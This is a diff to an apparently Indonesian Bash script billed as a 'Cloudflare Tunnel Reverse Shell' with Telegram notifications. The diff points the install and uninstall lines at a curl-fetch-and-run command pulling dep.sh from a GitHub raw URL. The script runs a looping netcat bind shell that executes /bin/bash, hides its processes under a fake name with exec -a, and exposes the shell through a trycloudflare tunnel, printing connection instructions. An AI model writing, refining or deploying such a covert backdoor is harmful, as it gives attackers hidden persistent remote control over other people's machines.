@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # Cloudflare Tunnel Reverse Shell (seperti gsocket) + Telegram notifikasi
-# Usage: bash -c "$(curl -fsSL https://domain/path/deploy.sh)"
-# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://domain/path/deploy.sh)"
+# Usage: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
+# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
 
 # ========== KONFIGURASI ==========
 : "${HOME:=/tmp}"
@@ -105,16 +105,17 @@ start_bindshell() {
     else
         bind_cmd="bash -c 'while true; do nc -l -p ${port} -s 127.0.0.1 -e /bin/bash 2>/dev/null; done'"
     fi
-    eval "exec -a \"${PROC_HIDDEN_NAME}\" nohup $bind_cmd &>/dev/null &"
+    # Jalankan dalam subshell background agar tidak menggantikan shell utama
+    ( exec -a "$PROC_HIDDEN_NAME" nohup $bind_cmd >/dev/null 2>&1 ) &
     echo $!
 }
 
 # ========== START TUNNEL (langsung, tanpa monitor) ==========
-# Fungsi ini hanya menjalankan tunnel dan mengembalikan PID
 start_tunnel_direct() {
     local port="$1"
     local bin="$2"
-    exec -a "$PROC_HIDDEN_NAME" "$bin" tunnel --url "tcp://127.0.0.1:${port}" 2>&1 >> "$TMPDIR/cloudflared.log" &
+    # Jalankan dalam subshell background, arahkan output ke log
+    ( exec -a "$PROC_HIDDEN_NAME" "$bin" tunnel --url "tcp://127.0.0.1:${port}" >> "$TMPDIR/cloudflared.log" 2>&1 ) &
     echo $!
 }
 
@@ -280,7 +281,7 @@ print_step "Executing webhooks..."
 finish_skip
 
 # --- Informasi uninstall ---
-echo "--> To uninstall use GS_UNDO=1 bash -c \"\$(curl -fsSL https://domain/path/deploy.sh)\""
+echo "--> To uninstall use GS_UNDO=1 bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)\""
 echo "--> To connect use one of the following:"
 echo "--> cloudflared access tcp --hostname <URL> --url localhost:4444 && nc localhost 4444"
 
@@ -301,9 +302,9 @@ EOF
 
 # Tunggu URL awal
 sleep 5
-# Cek log untuk URL
+# Cek log untuk URL (gunakan grep -oE untuk portabilitas)
 if [[ -f "$TMPDIR/cloudflared.log" ]]; then
-    url=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' "$TMPDIR/cloudflared.log" | head -1)
+    url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$TMPDIR/cloudflared.log" | head -1)
     if [[ -n "$url" ]]; then
         echo -e "\n\033[1;32m✅ TUNNEL URL: $url\033[0m"
         echo "Connect with: cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444"
